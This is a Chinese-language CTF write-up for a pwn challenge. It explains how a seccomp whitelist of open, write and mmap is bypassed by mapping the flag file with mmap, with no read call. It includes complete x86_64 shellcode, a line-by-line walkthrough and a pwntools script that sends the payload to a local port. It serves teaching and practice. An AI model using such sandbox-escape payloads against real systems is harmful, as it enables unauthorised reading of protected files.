# 知识点

栈

# 题目分析

分类：pwn / 栈。

本页按现有附件、脚本和分析记录归档；运行与解题状态见具体记录，整理过程未执行题目或远端脚本。

## 文件

- [ORIGINAL_NOTES.md](ORIGINAL_NOTES.md)
- [env/ld-2.31.so](env/ld-2.31.so)
- [env/libc.so.6](env/libc.so.6)
- [env/libseccomp.so.2](env/libseccomp.so.2)
- [shellcode](shellcode)

## 已有分析

- [ORIGINAL_NOTES.md](ORIGINAL_NOTES.md)
- [shellcode_wp.md](notes/shellcode_wp.md)


> **相关笔记：** `shellcode`（先看原理与最小验证） · `seccomp白名单怎么看`（规则审计） · `PWN输入输出与协议同步`（收发边界） · `动态调试shellcode`（标记法排错） · `WP索引与复盘入口`（复盘入口）

### shellcode 题解 — seccomp 白名单绕过（详细图解版）

#### 一、这是什么题？

题目给了一个叫 `shellcode` 的程序。名字就告诉你了——**这是一道 shellcode 题**。

程序的核心逻辑：

```c
int main() {
    init_sandbox();                          // ① 先开 seccomp 沙箱
    puts("Welcome to the shellcode challenge!");
    puts("Enough talk. Send your shellcode:");
    puts("You can send at most 0x100 bytes of shellcode.");

    void *buf = mmap(0, 0x1000, 7, MAP_PRIVATE|MAP_ANONYMOUS, -1, 0);  // ② 分配 RWX 内存
    read(0, buf, 0x100);                     // ③ 读入最多 256 字节 shellcode
    printf("Shellcode received, %zd bytes. Executing now!\n", n);
    ((void(*)())buf)();                      // ④ 直接跳过去执行
}
```

> [!note] 小白先理解：什么是 shellcode？
> shellcode 就是一段**机器码**，程序把你的输入当成代码来执行。你只要能拼出正确的机器码（汇编指令的二进制形式），就能控制程序做任何事——读文件、弹 shell 等等。
>
> 但这题有个限制：**seccomp 沙箱**。程序在让你输 shellcode 之前先开了一个沙箱，只允许特定的系统调用（syscall）通过。

---

#### 二、IDA 分析：找到 seccomp 白名单

##### 第一步：打开 IDA，找到 `init_sandbox` 函数

在 IDA 左侧 Functions 窗口找到 `init_sandbox`，双击进去，按 **F5** 看伪代码：

```c
void init_sandbox() {
    ctx = seccomp_init(0);                           // ① 初始化，默认动作=KILL
    seccomp_arch_add(ctx, 0xC000003E);               // ② 添加架构（x86_64）
    seccomp_rule_add(ctx, 0x7FFF0000, 2, 0);         // ③ 允许 syscall 2
    seccomp_rule_add(ctx, 0x7FFF0000, 1, 0);         // ④ 允许 syscall 1
    seccomp_rule_add(ctx, 0x7FFF0000, 9, 0);         // ⑤ 允许 syscall 9
    seccomp_load(ctx);                                // ⑥ 加载规则
    seccomp_release(ctx);                             // ⑦ 释放
}
```

##### 第二步：理解每一行的含义

```
seccomp_init(0)
    ↓
    参数 0 是 KILL 类默认动作
    这份样本里：不匹配后续 allow 规则的 syscall 会被内核以 SIGSYS 终止

seccomp_arch_add(ctx, 0xC000003E)
    ↓
    0xC000003E = SCMP_ARCH_X86_64
    意思是：这些规则针对 x86_64 架构

seccomp_rule_add(ctx, 动作, syscall号, 参数检查数量)
    ↓
    动作 0x7FFF0000 = SCMP_ACT_ALLOW（放行）
    syscall号 2 = open
    syscall号 1 = write
    syscall号 9 = mmap
    参数检查数量 0 = 不检查参数
```

> [!tip] 怎么知道 0x7FFF0000 是 ALLOW？
> 看 IDA 的汇编窗口会更清楚：
> ```asm
> mov  edi, 0          ; seccomp_init(0) → 默认 KILL
> call seccomp_init
>
> mov  esi, 0xC000003E ; arch = X86_64
> call seccomp_arch_add
>
> mov  edx, 2          ; syscall = 2 (open)
> mov  esi, 0x7FFF0000  ; action = ALLOW
> mov  ecx, 0          ; arg_cnt = 0 → 不检查参数
> call seccomp_rule_add
>
> mov  edx, 1          ; syscall = 1 (write)
> call seccomp_rule_add
>
> mov  edx, 9          ; syscall = 9 (mmap)
> call seccomp_rule_add
>
> call seccomp_load     ; 生效！
> ```
>
> 对照 libseccomp 的源码，`0x7FFF0000` = `SCMP_ACT_ALLOW`。
>
> 也可以用 `objdump -d ./shellcode` 直接看反汇编，不需要 IDA。

##### 第三步：画出白名单

```
┌──────────────────────────────────┐
│      seccomp 白名单               │
│                                  │
│  ✅ syscall 2  = open    (打开文件)│
│  ✅ syscall 1  = write   (写数据)  │
│  ✅ syscall 9  = mmap    (映射内存)│
│                                  │
│  ❌ 其他所有 syscall → 直接杀死    │
│     包括：read(0)、execve(59)、   │
│           exit(60)、sendfile(40)… │
└──────────────────────────────────┘
```

> [!warning] 关键发现
> **read(0) 被禁了！** 这意味着经典的 "open → read → write" 套路行不通。
> 我们得想办法**不用 read 也能把文件内容读出来**。

---

#### 三、解题思路：没有 read，怎么读文件？

##### 方案分析

| 方案 | 需要的 syscall | 可行性 |
|------|---------------|--------|
| open → read → write | 0,1,2 | ❌ read 被禁 |
| open → sendfile → stdout | 2,40 | ❌ sendfile 被禁 |
| open → mmap → write | 1,2,9 | ✅ **全在白名单！** |

##### mmap 映射文件的原理

```
普通读文件：
  open("flag") → read(fd, buf, 100) → write(1, buf, 100)
                  ↑                    ↑
              把文件内容               输出到屏幕
              拷到用户内存

mmap 读文件：
  open("flag") → mmap(..., fd, 0) → write(1, addr, 100)
                  ↑                   ↑
              把文件直接映射          直接从映射区域
              到进程内存！            输出到屏幕
              
  区别：mmap 让文件内容"出现"在内存里，不需要 read 来搬运！
```

```
用户进程内存空间：
┌──────────────────────┐ 高地址
│       栈 (stack)      │
├──────────────────────┤
│       ...            │
├──────────────────────┤
│   mmap 映射区域       │ ← mmap 把 flag 文件映射到这里
│   ┌──────────────┐   │
│   │ flag 文件内容  │   │  文件内容直接出现在内存中！
│   │ "flag{...}"   │   │  不需要 read() 搬运！
│   └──────────────┘   │
├──────────────────────┤
│       堆 (heap)       │
├──────────────────────┤
│       .bss           │
│       .data          │
│       .text (代码段)  │
└──────────────────────┘ 低地址
```

---

#### 四、方法论：怎么从零写出这段汇编

很多人看完逐行解释后还是问：**"你到底是怎么想出来这坨东西的？"**

这一节专门回答这个问题。写 shellcode 其实有个固定的翻译流程。

##### 第一步：用中文/伪代码写清楚"我要干什么"

```
我想要的：
1. 打开 "flag" 文件
2. 把文件内容弄到内存里
3. 把内存内容输出到屏幕

不能用 read（seccomp 禁了），所以第 2 步改用 mmap 映射。
```

##### 第二步：把每句话翻译成"我要调哪个 syscall"

每个 syscall 就是一个编号 + 一组参数。去查 [Linux syscall 表](https://filippo.io/linux-syscall-table/)：

```
"打开 flag 文件" → open
    syscall 号: 2
    参数: (文件名, 打开方式, mode)
    C 写法: open("flag", O_RDONLY, 0)

"把文件映射到内存" → mmap
    syscall 号: 9
    参数: (addr, length, prot, flags, fd, offset)
    C 写法: mmap(0, 256, PROT_READ, MAP_PRIVATE, fd, 0)

"输出到屏幕" → write
    syscall 号: 1
    参数: (fd, buf, count)
    C 写法: write(1, mmap地址, 256)
```

##### 第三步：把每个 syscall 的参数"填入"对应的寄存器

x86_64 syscall 有固定的寄存器映射：

```
C 函数参数   →   syscall 寄存器
─────────────────────────────────
第1个参数    →   rdi
第2个参数    →   rsi
第3个参数    →   rdx
第4个参数    →   r10      ← 注意！不是 rcx！
第5个参数    →   r8
第6个参数    →   r9
syscall号    →   rax
返回值       →   rax（调完 syscall 后）
```

把前面三个 syscall"填充"进去：

```
open("flag", O_RDONLY, 0)：
    rdi = "flag" 的地址
    rsi = 0        (O_RDONLY)
    rdx = 0        (没用)
    rax = 2         ← syscall 号

mmap(0, 256, PROT_READ, MAP_PRIVATE, fd, 0)：
    rdi = 0         (addr = 让内核选)
    rsi = 256       (length)
    rdx = 1         (prot = PROT_READ)
    r10 = 2         (flags = MAP_PRIVATE)
    r8  = fd        (open 返回的那个)
    r9  = 0         (offset)
    rax = 9         ← syscall 号

write(1, 映射地址, 256)：
    rdi = 1         (fd = stdout)
    rsi = 映射地址   (mmap 返回的那个)
    rdx = 256       (count)
    rax = 1         ← syscall 号
```

##### 第四步：处理"值的传递"——寄存器复用问题

```
问题来了：三个 syscall 要串起来执行，但寄存器是共享的！

open 的返回值（fd）→ 在 rax 里
但 mmap 也要用 rax 放 syscall 号(9)
→ 如果不保存，fd 就丢了！

解决方案：把 fd 临时存到"安全"的寄存器

什么寄存器不会被 syscall 破坏？
→ 根据调用约定，内核只读写 rax, rcx, r11, rdi, rsi, rdx, r10, r8, r9
→ r12, r13, r14, r15, rbx, rbp 是安全的

我们选 r12 暂存 fd（任意选一个安全的都行）

同理，mmap 的返回值（映射地址）→ 在 rax 里
write 也要用 rax 放 syscall 号(1)
→ 搬走！搬到 write 的第二个参数 rsi（恰巧 rsi 也是 write 需要的）
→ 一步两用：既保存了值，又直接放到了正确位置
```

##### 第五步：把每个寄存器赋值翻译成汇编指令

现在每一步都明确了"要把什么值放进哪个寄存器"，只需要翻译成指令：

```
"把 0 放进 rdi" →
    mov edi, 0      ← 5 字节，含 \x00
    xor edi, edi    ← 2 字节，无 \x00  ✓ 选这个

"把 9 放进 rax" →
    mov eax, 9      ← 5 字节
    xor eax,eax; mov al,9  ← 如果 eax 已经是 0，只需 mov al,9(2字节)
    
    到底用哪个？看上一条指令：
    之前 mmap 结束时 eax 是 mmap 返回值（一个内存地址，不是 0）
    所以不能偷懒，必须 mov eax,9

"把 r12 的值放进 r8" →
    mov r8, r12     ← 这不是赋值，是寄存器间传递
    不需要 xor 先清零，直接 mov
```

##### 第六步：解决"数据的地址从哪来"

```
rdi 需要指向 "flag" 这个字符串。但 "flag" 放在哪？

❌ 不能写死地址：mov rdi, 0x400123 ← 每次运行地址都不一样！
✅ 用相对地址：lea rdi, [rip + flag标签]

做什么：把字符串写在 shellcode 末尾，用 rip 相对寻址定位。
rip = 当前执行到的位置（程序计数器）
编译器自动算"从这条指令到 flag 标签有多少字节"

    执行流程：
    ┌──── shellcode 开头 ────┐
    │ ...代码...              │
    │ lea rdi,[rip+flag]     │ ← rip 在这，编译器算出 flag 离这 78 字节
    │ ...代码...              │
    │ jmp $                  │ ← 死循环挡住
    ├──── 数据区 ────────────┤
    │ "flag\0"               │ ← flag 标签在这
    └────────────────────────┘
```

##### 从零到完整 shellcode 的思维链条

```
① 想清楚逻辑（三个 syscall）
    ↓
② 查表确定 syscall 号和参数
    ↓
③ 把参数填入寄存器（遵守 syscall 调用约定，注意 r10 不是 rcx）
    ↓
④ 解决值传递（寄存器复用问题 → 用安全寄存器暂存）
    ↓
⑤ 翻译成指令（优先 xor 清零，优先 32 位操作，避开 \x00）
    ↓
⑥ 解决数据寻址（rip 相对寻址，数据放末尾，死循环挡住）
    ↓
⑦ 编译 → 发送 → 拿到 flag
```

---

#### 五、shellcode 逐行讲解：每一行为什么这样写

> [!note] 先理解：写 shellcode 跟写 C 程序的区别
> 写 C 程序时你只需要关心逻辑——`open("flag")` 一句话就行。
> 写 shellcode 时你必须手动填**每一个寄存器**，因为这是 CPU 唯一的沟通方式。
> 内核不看你的变量名、不看函数签名，只看 6 个寄存器里放了什么值。

下面是完整的 shellcode，拆成 5 步，逐条解释。

完整 shellcode：

```asm
xor eax,eax; mov al,2
lea rdi,[rip+flag]; xor esi,esi; xor edx,edx; syscall
mov r12,rax; test rax,rax; js die
xor edi,edi; mov esi,0x100; mov edx,1
mov r10d,2; mov r8,r12; xor r9d,r9d; mov eax,9; syscall
mov rsi,rax; mov eax,1; mov edi,1; mov edx,0x100; syscall
die: jmp $
flag: .asciz "flag"
```

---

##### Step 1: open("flag", O_RDONLY) — 打开文件

```asm
xor eax,eax          ; ①
mov al,2             ; ②
lea rdi,[rip+flag]   ; ③
xor esi,esi          ; ④
xor edx,edx          ; ⑤
syscall               ; ⑥
```

###### ① `xor eax,eax` — 把 rax 清零

```
问题：为什么不写 mov eax,0？
答案：xor eax,eax 占 2 字节，mov eax,0 占 5 字节。
     shellcode 越小越好，而且 mov 会在机器码里出现 \x00（空字节），
     很多输入函数（如 gets、scanf）遇到 \x00 就截断了。
     xor eax,eax 不会产生 \x00 字节，是写 shellcode 的标准做法。

执行前：rax = 垃圾值（不知道是什么）
执行后：rax = 0（低 32 位清零，高 32 位也自动清零）
```

> [!note] 为什么 `xor eax,eax` 连 rax 的高 32 位也清零？
> x86_64 有一条规则：任何对 32 位寄存器的操作，会自动把对应 64 位寄存器的高 32 位清零。
> `eax` 是 32 位寄存器，`xor eax,eax` 清零了 eax → rax 的高 32 位也自动清零。

###### ② `mov al,2` — 设置 syscall 号为 2

```
问题：为什么用 al 而不是 eax？
答案：eax 已经被上一步清零了（全是 0），只需要改最低 8 位。
     mov al,2 占 2 字节。mov eax,2 占 5 字节。
     省字节 + 避免 \x00 = 写 shellcode 的惯性。

al 是 rax 的最低 8 位：
┌──────────────────────┬──────────────┬─────┬──────┐
│    高 32 位           │   低 32 位高 24 位│  ah  │  al   │
│    00000000          │    000000     │ 00  │  02  │
└──────────────────────┴──────────────┴─────┴──────┘
                      ←     eax      →  ← ax →
                      ←              rax              →

现在 rax = 2  →  内核知道我们要调 syscall_open
```

###### ③ `lea rdi,[rip+flag]` — 把 "flag" 的地址放进 rdi

```
这是整个 shellcode 最难理解的一行。拆开来讲：

问题：为什么不写 mov rdi, 0x123456（flag 的绝对地址）？
答案：因为 shellcode 被加载到哪块内存我们不知道！
     程序的 PIE/ASLR 会让地址每次运行都不一样。
     我们必须用"相对地址"——"从我当前执行的位置往后数多少字节"。

lea rdi,[rip+flag] 的意思是：
    rdi = rip（当前指令的地址） + flag 标签的偏移量

编译器帮我们算：
    rip 在这条指令执行时指向下一条指令的地址
    flag 标签代表 shellcode 末尾那段 "flag\0" 数据的位置
    rip + (flag - 当前指令) = "flag" 字符串的实际运行时地址

示意图（shellcode 在内存中）：
    ┌──────────────────┐
    │  xor eax,eax     │ ← shellcode 开头
    │  mov al,2        │
    │  lea rdi,[rip+…] │ ← 这里执行时，rip 指向下一条（syscall）
    │  xor esi,esi     │
    │  ...             │
    │  jmp $           │
    │  "flag\0"        │ ← flag 标签指向这里
    └──────────────────┘
    
    rip + 偏移量 = 刚好指到 "flag\0" 的位置
    → rdi = 指向 "flag\0" 的指针
```

###### ④ `xor esi,esi` — 第二个参数 = 0

```
open 的第二个参数是 flags：
    0 = O_RDONLY（只读方式打开）
    1 = O_WRONLY（只写）
    2 = O_RDWR（读写）

我们只需要读文件，所以传 0。
xor esi,esi 把 32 位清零 → rsi = 0
```

###### ⑤ `xor edx,edx` — 第三个参数 = 0

```
open 的第三个参数是 mode，只在创建文件时有用（O_CREAT）。
我们只是打开已有文件，这个参数用不上，传 0 即可。
xor edx,edx → rdx = 0
```

###### ⑥ `syscall` — 真正执行

```
这一条指令让 CPU 陷入内核，内核根据 rax 里的 syscall 号找到对应的处理函数。
内核看到的：open(rdi="flag", rsi=O_RDONLY, rdx=0)
返回值：成功 → rax = 文件描述符（比如 3），失败 → rax = 负数（比如 -2）
```

> [!note] 文件描述符是什么？
> 操作系统用数字来代表"打开的文件"。0、1、2 已经被占用了（stdin、stdout、stderr），所以 open 返回的 fd 通常从 3 开始。fd 就是一个整数，后续操作通过它来指代这个文件。

---

##### Step 2: 检查 open 是否成功

```asm
mov r12,rax          ; ①
test rax,rax         ; ②
js die               ; ③
```

###### ① `mov r12,rax` — 保存 fd 到 r12

```
为什么需要保存？
    接下来要调 mmap，rax 会被改成 9（mmap 的 syscall 号）。
    如果不把 fd 存起来，它就被覆盖了，mmap 不知道要映射哪个文件。

为什么选 r12？
    根据 x86_64 调用约定，r12 是"被调用者保存"寄存器。
    内核不会碰它——我们调 syscall 时，内核只读写 rax, rdi, rsi, rdx, r10, r8, r9 和 rcx, r11。
    r12 是绝对安全的存储位置。
```

###### ② `test rax,rax` — 检查 rax 是正还是负

```
计算机里，负数用补码表示，最高位（bit 63）是 1。
test rax, rax 做的是 rax & rax，结果还是 rax 本身。
但它的目的是设置 CPU 的标志位（flags）：
    - 如果 rax 的最高位是 1（负数）→ Sign Flag (SF) = 1
    - 如果 rax 的最高位是 0（正数或 0）→ Sign Flag (SF) = 0
```

###### ③ `js die` — 负的就跳走

```
js = Jump if Sign（如果符号位为 1 就跳）
如果 open 失败返回负数（比如 -2 = 文件不存在），SF=1 → 跳到 die
如果 open 成功返回正数（比如 3），SF=0 → 不跳，继续执行 mmap
```

---

##### Step 3: mmap 映射文件到内存

```asm
xor edi,edi          ; ① rdi = 0（让内核自己选映射地址）
mov esi,0x100        ; ② rsi = 256（映射大小：256 字节）
mov edx,1            ; ③ rdx = 1（PROT_READ = 只读）
mov r10d,2           ; ④ r10 = 2（MAP_PRIVATE = 私有映射）
mov r8,r12           ; ⑤ r8 = fd（刚才保存的文件描述符）
xor r9d,r9d          ; ⑥ r9 = 0（从文件开头开始映射）
mov eax,9            ; ⑦ rax = 9（mmap 的 syscall 号）
syscall               ; ⑧
```

###### ① `xor edi,edi` — addr = 0，让内核选地址

```
mmap 的第一个参数：希望映射到哪个地址。
传 NULL(0) 表示"我不挑，你帮我找个空地方"。
```

###### ② `mov esi,0x100` — 映射 256 字节

```
0x100 = 256。这是**本题脚本选择的映射长度**，不是“flag 一定小于 256”的系统规则。

映射长度与 shellcode 输入上限也没有必然关系。真正要看的是题目文件可能的长度、之后要访问的范围，以及是否允许其他 syscall。对普通文件映射，访问超出文件末尾所在页的区域可能触发 SIGBUS；因此不要把“映射 0x100 后固定输出 0x100”迁移到所有题目。
```

###### ③ `mov edx,1` — 只读权限

```
PROT_READ  = 1  — 只允许读
PROT_WRITE = 2  — 允许写
PROT_EXEC  = 4  — 允许执行

我们只需要读内容然后 write 输出，所以 PROT_READ (1) 就够了。
```

###### ④ `mov r10d,2` — MAP_PRIVATE

```
MAP_PRIVATE = 2  — 对映射的写入是写时复制，不传播回底层文件
MAP_SHARED  = 1  — 修改对其他映射可见；是否以及何时落盘还受文件系统与同步语义影响

我们用的是 MAP_PRIVATE(2)。
顺便说一下 r10：为什么是 r10 而不是 rcx？
    x86_64 syscall 约定里，第 4 个参数用 r10，不是 rcx！
    因为 syscall 指令会自动把 rip 存到 rcx，把 rflags 存到 r11。
    所以 rcx 在 syscall 时被破坏了，内核用 r10 来拿第 4 个参数。
    
    普通函数调用：rdi, rsi, rdx, rcx, r8, r9
    syscall 调用：  rdi, rsi, rdx, r10, r8, r9
                                ↑
                          这里不一样！
```

> [!warning] 最容易搞错的地方
> 函数调用用 `rcx` 传第 4 个参数，syscall 用 `r10`。搞混了参数就全乱了。

###### ⑤ `mov r8,r12` — fd = 之前 open 返回的文件描述符

```
r12 是我们在 Step 2 保存的 fd。
r8 是 mmap 的第 5 个参数（文件描述符）。

为什么不一开始就用 r8 存 fd？
    open 的返回值在 rax 里。我们想把它挪到 mmap 需要的 r8 里。
    但中间还要设置 mmap 的其他参数，rax 会被用来设 syscall 号(9)。
    所以先暂存在 r12，等别的参数都设好了再搬过来。
```

###### ⑥ `xor r9d,r9d` — 偏移量 = 0

```
从文件的开头开始映射。offset=0 表示从文件第 0 个字节开始。
如果 offset=10，就会跳过前 10 个字节。
```

###### ⑦ `mov eax,9` — syscall 号 = 9

```
eax 之前是 open 的返回值（fd）。现在要调 mmap 了，把它改成 9。
```

###### ⑧ `syscall` — 执行

```
内核看到的：mmap(addr=0, len=256, prot=PROT_READ, flags=MAP_PRIVATE, fd=<open 返回的 fd>, offset=0)
内核做的事：
    1. 在进程内存里找一块空闲区域
    2. 把 open 返回的文件描述符对应内容映射到这块区域
    3. 返回这块区域的起始地址到 rax
    
返回值：成功 → rax = 内存地址（如 0x7f1234560000），失败 → rax = -1。这里 offset=0 天然满足文件映射“offset 必须按页大小对齐”的要求；换成非 0 offset 时必须重新核对。
```

---

##### Step 4: write(1, 映射地址, 256) — 输出到屏幕

```asm
mov rsi,rax          ; ① rsi = mmap 返回的内存地址
mov eax,1            ; ② rax = 1（write 的 syscall 号）
mov edi,1            ; ③ rdi = 1（stdout = 输出到屏幕）
mov edx,0x100        ; ④ rdx = 256（写 256 字节）
syscall               ; ⑤
```

###### ① `mov rsi,rax` — 把 mmap 的返回值搬到 rsi

```
为什么这一步最危险？
    mmap 的返回值在 rax 里，这是一个内存地址。
    接下来要把 rax 改成 1（write 的 syscall 号），地址就丢了。
    所以先搬走——mov rsi,rax。

为什么搬到 rsi？
    因为 write 的第 2 个参数（buf=要输出的数据在哪）正好要用 rsi。
    一步两用：既保存了值，又直接放到了 write 需要的寄存器里。
```

###### ② `mov eax,1` — syscall 号 = 1

```
eax 现在是 mmap 返回的地址。改成 1 → 告诉内核：我要调 write。
```

###### ③ `mov edi,1` — fd = 1 (stdout)

```
write 的第 1 个参数：写到哪个文件。
0 = stdin, 1 = stdout, 2 = stderr
我们想输出到屏幕，所以传 1（stdout）。
```

###### ④ `mov edx,0x100` — 写 256 字节

```
这里把 0x100 作为演示用 count。它不是“文件真实长度”，也不是 write 必定完整输出的承诺：write 可以短写，且对文件映射访问不当可能报错。若题目允许 read，优先把 read 的实际返回值作为 write 的 count；本题不能 read，才在核对题目文件大小后采用固定 count。
```

###### ⑤ `syscall` — 输出！

```
内核看到：write(fd=1, buf=映射地址, count=256)
效果：flag 内容出现在屏幕上！
```

---

##### Step 5: 收尾 — 死循环

```asm
die:
jmp $
```

```
jmp $ = jmp 到当前地址（$ 表示当前指令的地址）
等于 while(1); 无限循环。

为什么不用 exit(60)？
    白名单只有 {open, write, mmap}，exit(60) 不在里面。
    调 exit → seccomp 拦下来 → SIGSYS 杀掉进程。
    
这里的死循环只是在“exit 未放行”时避免再触发被禁止 syscall；它会持续占用 CPU。write 成功返回表示内核已接受相应字节，不需要靠死循环才“保证收到”。脚本仍应按题目的输出协议用 recv/recvall 和超时收取结果。
```

---

##### 数据段

```asm
flag:
.asciz "flag"
```

```
.asciz = .ascii + 自动加 \0 结尾
等价于：.ascii "flag\0"
占用 5 字节：'f' 'l' 'a' 'g' '\0'

为什么叫 flag？
    只是标签名，编译后变成偏移量。
    lea rdi,[rip+flag] 中的 flag 就是这个标签。
    
为什么放在最后？
    代码执行完不要经过数据段。如果 CPU 跑到数据上执行，
    会把 "flag\0" 当成机器码来解码 → 崩溃。
    用 jmp $ 在数据前面死循环，CPU 永远不会碰到数据段。
```

> [!note] 为什么这里用 `jmp $`，而不写 `exit(60)`？
> 这是这道题的**白名单适配**，不是 shellcode 通用收尾模板：先 dump BPF，确认 exit 是否真的未放行。若 exit 被禁，`jmp $` 可以防止下一条落入数据区或触发禁止 syscall；代价是它会忙等。脚本端应当设置接收超时，而不是把“进程活着”误认为网络输出必然完成。

##### syscall 参数寄存器对照

```
syscall 调用约定（x86_64）：
┌──────┬──────────┬──────────────────┐
│ 寄存器 │  参数    │  本次 shellcode  │
├──────┼──────────┼──────────────────┤
│ rax  │ syscall号 │ 变化：2→9→1     │
│ rdi  │ 第1个参数 │ open:文件名指针  │
│      │          │ mmap:0(自动选地址)│
│      │          │ write:1(stdout)  │
│ rsi  │ 第2个参数 │ open:0(O_RDONLY) │
│      │          │ mmap:0x100(大小) │
│      │          │ write:映射地址    │
│ rdx  │ 第3个参数 │ open:0(无用)     │
│      │          │ mmap:1(PROT_READ)│
│      │          │ write:0x100(长度) │
│ r10  │ 第4个参数 │ mmap:2(MAP_PRIVATE)│
│ r8   │ 第5个参数 │ mmap:fd(文件描述符)│
│ r9   │ 第6个参数 │ mmap:0(偏移量)  │
└──────┴──────────┴──────────────────┘
```

##### 一段话总结这段 shellcode

```
open("flag")                        → 拿到文件描述符 fd
    ↓
mmap(0, 256, 读, 私有映射, fd, 0)   → 文件内容直接出现在内存地址 addr
    ↓
write(1, addr, 256)                → 把内存内容打印到屏幕
    ↓
jmp $                              → 死循环（exit 被禁）
```

---

#### 六、pwntools 发送脚本

```python
from pwn import *
context.arch = 'amd64'

sc = asm("""
    xor eax,eax; mov al,2
    lea rdi,[rip+flag]; xor esi,esi; xor edx,edx; syscall
    mov r12,rax; test rax,rax; js die
    xor edi,edi; mov esi,0x100; mov edx,1
    mov r10d,2; mov r8,r12; xor r9d,r9d; mov eax,9; syscall
    mov rsi,rax; mov eax,1; mov edi,1; mov edx,0x100; syscall
die: jmp $
flag: .asciz "flag"
""")

io = remote("127.0.0.1", 31757)   # 远程
### io = process('./shellcode')           # 本地测试（需要 echo flag > flag）
io.recvuntil(b"Send your shellcode:")
io.send(sc)
io.recvuntil(b"Executing now!")
print(io.recvall(timeout=3).decode(errors='replace'))
io.close()
```

> [!note] 为什么不用 `interactive()`，用 `recvall`？
> 普通题拿到 shell 后用 `io.interactive()` 接管终端敲命令。
> 但这题 shellcode 结尾是 `jmp $`（死循环），进程永不退出——`interactive()` 会一直等你输入，卡住不动。
> `recvall(timeout=3)` 的意思是：不管进程死没死，收完现有的输出等 3 秒就返回。
> `.decode(errors='replace')` 把 bytes 转成字符串，遇到乱码用 `�` 替代不崩溃。
> `io.close()` 断开连接（不写也行，脚本结束自动断）。

> [!note] `asm()` 是做什么的？
> pwntools 的 `asm()` 函数把汇编代码编译成机器码（bytes）。编译后的 shellcode 就是一小段二进制数据，程序收到后会直接当成代码执行。

---

#### 七、调试踩坑记录

##### 坑 1：SIGSYS — 以为 mmap 被禁，其实是 exit

```
最初版本结尾用了 exit(60)，每次跑都收到 SIGSYS
以为 open/mmap/write 有问题
结果是用 debug 脚本逐个测试后发现每个都通
→ 罪魁祸首是 exit(60) 不在白名单！
→ 换成 jmp $ 解决
```

##### 坑 2：MAP_SHARED vs MAP_PRIVATE

```
一开始用了 MAP_SHARED(1)
虽然在“只读、不改映射”的这个样本中也能工作，但 MAP_PRIVATE(2) 更贴近目标
MAP_PRIVATE 的写入是写时复制，不传播回底层文件
MAP_SHARED 的改动对共享映射可见，落盘语义还需要结合文件系统与同步操作理解
```

##### 坑 3：open 失败没有检查

```
没检查 open 返回值的话，open 失败返回 -1
-1 传给 mmap 当 fd 用 → mmap 返回 -1（MAP_FAILED）
-1 传给 write 当地址用 → 段错误崩溃
→ 加 test rax,rax; js die 解决
```

##### 坑 4：pwntools interactive() 挂住

```
shellcode 结尾是 jmp $（死循环），进程永远不退出
pwntools 的 interactive() 会一直等输入/输出 → 卡住
→ 改用 recvall(timeout=3)，收完输出就结束
```

---

#### 八、同类题目通用解法框架

```
1. IDA 打开二进制 → 找到 init_sandbox
2. 看 seccomp_rule_add 的 edx 参数（syscall 号）
3. 列出白名单
4. 对照模板选方案：
   ├── read+write+open    → 经典 ORW
   ├── write+open+mmap    → mmap 映射文件（本题）
   ├── write+open+sendfile → sendfile 代替 read
   ├── read+write+openat  → openat 代替 open
   ├── write+open+getdents → 列目录找文件名
   └── execve             → 弹 shell
5. 最后检查终止路径：exit 是否被放行？若没有，选择不会继续落入数据区的结尾，并让接收端有超时
```

> [!tip] 快速工具
> ```bash
> # 不用 IDA 也行：objdump 直接看
> objdump -d ./shellcode | grep -A5 "seccomp_rule_add"
>
> # 或者用 seccomp-tools（最方便）
> seccomp-tools dump ./shellcode
> # 输出：
> #  line  CODE  JT   JF      K
> # =================================
> #  0000: ... if syscall == 2 goto 0007 else goto 0001
> #  ...
> #  0007: ... ALLOW
> ```

---

#### 九、关键知识点

1. **seccomp** = Linux 内核的 syscall 过滤器，可以精确控制进程能用哪些系统调用
2. **mmap 映射文件** = 直接把文件内容映射到进程内存空间，不需要 read 搬运
3. **RIP 相对寻址** = `lea rdi,[rip+flag]` 让 shellcode 找到自己的数据（不用绝对地址）
4. **jmp $** = 忙等式死循环；这里只是 exit 被禁时的任务内收尾，不是“保证接收输出”的机制
5. **MAP_PRIVATE** = 私有、写时复制映射；本题只读取它，不应把共享映射的回写语义简单化

#### 十、原文档与本题结论的边界

- [seccomp_init(3)](https://man7.org/linux/man-pages/man3/seccomp_init.3.html)：默认动作在 seccomp_load 后才真正约束 syscall；KILL 动作的效果以当前 libseccomp/内核文档为准。
- [seccomp_rule_add(3)](https://man7.org/linux/man-pages/man3/seccomp_rule_add.3.html)：规则的 action、syscall 与参数比较必须全部从样本或 BPF dump 核对。
- [open(2)](https://man7.org/linux/man-pages/man2/open.2.html)：成功时返回非负 fd；不要硬编码 fd=3。
- [mmap(2)](https://man7.org/linux/man-pages/man2/mmap.2.html)：查看 offset 对齐、MAP_PRIVATE、MAP_FAILED 与文件末尾访问限制。
- [write(2)](https://man7.org/linux/man-pages/man2/write.2.html)：查看短写及返回值；`count` 不是“肯定发出去的字节数”。

本篇中的地址、白名单和 0x100 长度都属于该练习样本。迁移到另一题前，至少重新验证：架构、BPF 规则、shellcode 入口 mapping、文件路径、读写长度和远程收发协议。

#### 相关代码与实战模板

- 本页模板入口：`pwntools EXP 启动骨架` · `GDB 观察模板`。
- 全局选择：`选择指南`；完整逐篇清单：`逐篇映射表`。
- 相关题目/WP：本页即题解；`全部题解索引`。
- 本页已有代码片段是教学/题解材料；除非验证报告明确记录对应目标和验收结果，不应视为可运行模板或 exploit 成功。


# EXP

当前归档中没有已识别的 EXP / 求解脚本。
